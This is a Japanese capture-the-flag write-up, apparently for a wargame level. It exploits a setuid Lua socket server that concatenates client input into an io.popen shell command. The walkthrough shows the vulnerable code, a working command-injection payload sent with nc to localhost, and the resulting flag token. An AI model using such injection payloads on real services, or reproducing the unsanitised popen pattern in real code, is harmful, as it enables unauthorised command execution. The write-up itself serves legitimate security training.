# Level 11

## 目的
ユーザー `flag11` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level11` ユーザーでログイン後、ホームディレクトリにある `level11.lua` を確認します。

```bash
ls -l level11.lua
```
SetUIDされたLuaスクリプトです。中身を確認します。

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  -- ...
end

while 1 do
  local client = server:accept()
  -- ...
  local l, err = client:receive()
  if not err then
      local h = hash(l)
      -- ...
  end
  client:close()
end
```

このスクリプトは `127.0.0.1:5151` でリッスンし、接続したクライアントからパスワードを受け取ります。
受け取ったパスワード `pass` は、`io.popen` 関数内でシェルコマンドの一部として連結されています。

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

### 2. 脆弱性の特定

変数 `pass` の内容がサニタイズ（無害化）されずにそのままシェルコマンドに埋め込まれているため、**OSコマンドインジェクション**の脆弱性があります。
攻撃者は `pass` にセミコロン `;` などのコマンド区切り文字を含めることで、任意のコマンドを実行させることができます。

### 3. エクスプロイト（攻撃）

`nc` コマンドを使用してローカルホストのポート5151に接続し、攻撃コードを送信します。
攻撃コードとして `; getflag > /tmp/flag11` を送信します。

```bash
echo "; getflag > /tmp/flag11" | nc localhost 5151
```

これにより、サーバー側（`flag11` 権限）で以下のコマンドが実行されます。
```bash
echo ; getflag > /tmp/flag11 | sha1sum
```
`getflag` が実行され、その結果が `/tmp/flag11` に書き込まれます。

### 4. 結果

出力ファイルを確認します。

```bash
cat /tmp/flag11
```
出力:
```text
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## 結果

### トークン (Flag)
`fa6v5ateaw21peobuub8ipe6s`
